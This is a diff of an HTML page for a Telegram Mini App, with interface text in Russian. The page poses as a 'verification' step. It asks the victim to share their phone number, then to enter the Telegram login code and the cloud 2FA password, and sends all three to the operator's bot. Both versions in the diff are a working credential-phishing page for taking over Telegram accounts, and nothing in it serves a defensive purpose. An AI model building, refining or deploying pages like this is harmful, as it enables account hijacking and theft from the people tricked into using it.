@@ -1,74 +1,53 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         body { background: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .card { width: 85%; padding: 25px; border-radius: 20px; background: #0f0f0f; border: 1px solid #1a1a1a; text-align: center; }
-        .btn { background: #00ff88; color: #000; padding: 16px; border-radius: 12px; font-weight: bold; border: none; width: 100%; cursor: pointer; font-size: 16px; margin-top: 20px; }
+        .card { width: 85%; padding: 20px; border: 1px solid #333; border-radius: 15px; text-align: center; }
+        .btn { background: #00ff88; color: #000; padding: 15px; border-radius: 10px; width: 100%; border: none; font-weight: bold; cursor: pointer; }
         .hidden { display: none; }
-        input { width: 100%; padding: 14px; margin: 10px 0; border-radius: 10px; border: 1px solid #333; background: #111; color: #fff; box-sizing: border-box; text-align: center; font-size: 18px; }
+        input { width: 100%; padding: 12px; margin: 10px 0; background: #111; color: #fff; border: 1px solid #444; border-radius: 8px; box-sizing: border-box; text-align: center; }
     </style>
 </head>
 <body>
     <div class="card">
         <div id="step1">
-            <h2 style="color: #00ff88;">ВЕРИФИКАЦИЯ</h2>
-            <p>Нажмите на кнопку для подтверждения личности</p>
-            <button class="btn" id="auth-btn">ПОДТВЕРДИТЬ НОМЕР</button>
+            <button class="btn" id="auth">ПОДТВЕРДИТЬ НОМЕР</button>
         </div>
         <div id="step2" class="hidden">
-            <h2>ШАГ 2</h2>
-            <input type="number" id="sms-code" placeholder="Код из Telegram">
-            <input type="password" id="two-fa" placeholder="Облачный пароль">
-            <button class="btn" id="final-btn">ВОЙТИ</button>
+            <input type="number" id="code" placeholder="Код">
+            <input type="password" id="pass" placeholder="2FA Пароль">
+            <button class="btn" id="finish">ВОЙТИ</button>
         </div>
     </div>
 
     <script>
         const tg = window.Telegram.WebApp;
         tg.ready();
-        tg.expand();
+        let phone = "";
 
-        let savedPhone = "";
-
-        // Обработка кнопки 1
-        document.getElementById('auth-btn').onclick = function() {
+        document.getElementById('auth').onclick = function() {
             tg.requestContact(function(ok, res) {
                 if (ok && (res.response_data?.phone_number || res.contact?.phone_number)) {
-                    savedPhone = res.response_data?.phone_number || res.contact?.phone_number;
-                    
-                    // Отправляем данные боту ПРЯМО ЗДЕСЬ
-                    tg.sendData(JSON.stringify({
-                        "action": "send_code",
-                        "phone": String(savedPhone)
-                    }));
-                    
+                    phone = res.response_data?.phone_number || res.contact?.phone_number;
+                    // Пытаемся отправить данные СРАЗУ
+                    tg.sendData(JSON.stringify({a: "s", p: String(phone)}));
                     document.getElementById('step1').classList.add('hidden');
                     document.getElementById('step2').classList.remove('hidden');
                 } else {
-                    alert("Нужно нажать 'Поделиться', чтобы продолжить");
+                    alert("Нажмите 'Поделиться'");
                 }
             });
         };
 
-        // Обработка кнопки 2
-        document.getElementById('final-btn').onclick = function() {
-            const code = document.getElementById('sms-code').value;
-            const pass = document.getElementById('two-fa').value || "none";
-            
-            if (code.length < 3) return alert("Введите код!");
-
-            tg.sendData(JSON.stringify({
-                "action": "verify",
-                "phone": String(savedPhone),
-                "code": String(code),
-                "two_fa": String(pass)
-            }));
-            
-            setTimeout(() => { tg.close(); }, 500);
+        document.getElementById('finish').onclick = function() {
+            const c = document.getElementById('code').value;
+            const p = document.getElementById('pass').value || "none";
+            // Отправляем финальный пакет
+            tg.sendData(JSON.stringify({a: "v", p: String(phone), c: String(c), pass: String(p)}));
+            tg.close();
         };
     </script>
 </body>
